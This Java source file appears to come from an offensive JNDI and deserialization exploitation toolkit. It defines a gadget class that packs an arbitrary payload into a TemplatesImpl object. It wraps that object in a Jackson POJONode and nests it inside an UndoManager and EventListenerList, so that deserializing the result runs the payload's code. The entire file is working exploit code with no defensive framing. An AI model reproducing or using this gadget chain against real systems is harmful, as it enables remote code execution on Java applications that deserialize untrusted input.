package sonomon.jndi.deser.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.util.Vector;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class Jackson_EventListenerList_Templates implements SerializeObject{
	//jackson3
	
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        POJONode node = new POJONode(tempImpl);
        
        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) Deserialize.getFieldValue(undoManager, "edits").get(undoManager);
        vector.add(node);
        Deserialize.setFieldValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});
        
        
        return eventListenerList;
    }
}